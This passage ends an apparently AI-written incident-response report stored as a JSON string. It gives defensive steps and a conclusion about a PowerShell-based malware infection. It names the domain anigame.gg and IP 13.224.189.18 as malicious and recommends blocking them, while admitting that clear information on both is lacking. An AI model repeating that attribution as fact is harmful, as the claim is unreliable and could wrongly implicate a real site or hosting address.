Actions:**\n\n* **Isolate the Infected Host:** Immediately isolate the infected host from the network to prevent further spread of the malware.\n* **Full System Scan:** Conduct a thorough scan of the infected host using multiple reputable antivirus and anti-malware solutions.\n* **Memory Forensics:** Perform memory forensics to identify any running malicious processes and further analyze the malware's behavior.\n* **Network Traffic Analysis:** Analyze network traffic logs to identify any communication between the infected host and external servers. This can help determine command and control infrastructure and data exfiltration.\n* **Domain and IP Investigation:** Conduct a deeper investigation into the domain `anigame.gg` and the IP address 13.224.189.18 using various threat intelligence platforms and tools.  Focus on identifying any related infrastructure and past malicious activity.\n* **Block the Malicious Domain and IP:** Block the domain `anigame.gg` and the IP address 13.224.189.18 at the firewall and other network security devices to prevent further infections.\n* **Review Security Controls:** Review existing security controls and identify any weaknesses that allowed the malware to bypass defenses.  Implement necessary improvements to prevent similar incidents in the future.\n* **User Education:** Educate users about the risks of downloading and executing files from untrusted sources and the importance of reporting suspicious activity.\n\n**5. Conclusion:**\n\nThe evidence strongly suggests a malware infection facilitated by a sophisticated PowerShell script. The investigation revealed several key indicators of compromise, requiring immediate action to contain the threat and mitigate potential damage. Further investigation is crucial to fully understand the scope and impact of the incident and to improve security posture against future threats.  The lack of clear information on the domain and IP address highlights the need for more robust threat intelligence gathering and analysis.\n"
 }
